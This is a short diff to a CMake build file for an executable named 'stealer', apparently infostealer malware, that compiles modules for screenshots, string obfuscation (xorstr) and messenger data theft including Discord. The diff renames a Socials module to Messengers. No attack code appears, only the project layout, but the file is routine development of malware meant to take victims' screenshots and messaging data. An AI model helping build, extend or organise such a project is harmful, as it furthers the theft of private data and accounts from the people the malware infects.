@@ -32,8 +32,8 @@ add_executable(stealer WIN32 src/main.cpp
         src/stealer/impl/Screenshot.cpp
         src/stealer/impl/Screenshot.h
         include/xorstr.hpp
-        src/stealer/impl/messengers/Socials.cpp
-        src/stealer/impl/messengers/Socials.h
+        src/stealer/impl/messengers/Messengers.cpp
+        src/stealer/impl/messengers/Messengers.h
         src/stealer/impl/messengers/impl/Discord.cpp
         src/stealer/impl/messengers/impl/Discord.h
         include/json.hpp
